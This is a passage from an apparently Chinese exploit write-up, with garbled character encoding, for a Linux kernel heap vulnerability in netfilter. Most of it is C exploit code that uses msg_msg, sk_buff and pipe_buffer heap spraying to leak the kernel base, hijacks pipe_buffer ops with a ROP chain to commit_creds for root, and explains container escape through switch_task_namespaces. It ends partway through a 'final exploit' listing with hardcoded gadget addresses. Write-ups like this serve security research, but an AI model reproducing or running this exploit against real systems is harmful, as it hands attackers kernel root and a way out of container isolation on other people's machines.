addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;</span><br><span class="line">    ops_ptr-&gt;release = <span class="number">0xffffffff8183b4d3</span> + kernel_offset;<span class="comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span></span><br><span class="line">    ops_ptr-&gt;confirm = <span class="number">0xffffffff81689ea4</span> + kernel_offset;<span class="comment">// pop rdx ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒ</p><p><img src="https://s2.loli.net/2022/03/31/pwtTNfU3Xa1smzO.png" alt="image.png"></p><h2 id="å®¹å™¨é€ƒé€¸"><a href="#å®¹å™¨é€ƒé€¸" class="headerlink" title="å®¹å™¨é€ƒé€¸"></a>å®¹å™¨é€ƒé€¸</h2><h3 id="Step-VI-åˆ‡æ¢è¿›ç¨‹å‘½åç©ºé—´ï¼Œå®Œæˆå®¹å™¨é€ƒé€¸"><a href="#Step-VI-åˆ‡æ¢è¿›ç¨‹å‘½åç©ºé—´ï¼Œå®Œæˆå®¹å™¨é€ƒé€¸" class="headerlink" title="Step.VI åˆ‡æ¢è¿›ç¨‹å‘½åç©ºé—´ï¼Œå®Œæˆå®¹å™¨é€ƒé€¸"></a>Step.VI åˆ‡æ¢è¿›ç¨‹å‘½åç©ºé—´ï¼Œå®Œæˆå®¹å™¨é€ƒé€¸</h3><p>ç°åœ¨æˆ‘ä»¬å·²ç»èƒ½å¤Ÿåœ¨å†…æ ¸ç©ºé—´è¿›è¡Œ ROP äº†ï¼Œé‚£ä¹ˆå®Œæˆå®¹å™¨é€ƒé€¸å…¶å®æ˜¯é¡ºæ°´æ¨èˆŸçš„äº‹æƒ…ï¼Œå®¹å™¨å¸¸ç”¨çš„éš”ç¦»æ‰‹æ®µæ˜¯åˆ©ç”¨å‘½åç©ºé—´è¿›è¡Œéš”ç¦»ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨å†…æ ¸ä¸­å°†è¿›ç¨‹çš„å‘½åç©ºé—´åˆ‡æ¢ä¸ºåˆå§‹çš„å…¨å±€å‘½åç©ºé—´ <code>init_nsproxy</code> å³å¯å®Œæˆå®¹å™¨é€ƒé€¸ï¼Œæ‰§è¡Œ<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> å³å¯æ›¿æ¢æ‰å½“å‰è¿›ç¨‹çš„å‘½åç©ºé—´</p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>æ•´åˆäº†å®¹å™¨é€ƒé€¸åçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82a63be0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_PROXY 0xffffffff82a639a0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RSI_RET 0xffffffff811594bd</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RAX_POP_RDI_RET 0xffffffff81159547</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIND_TASK_BY_VPID 0xffffffff810c7d40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TASK_NAMESPACES 0xffffffff810cfc90</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> 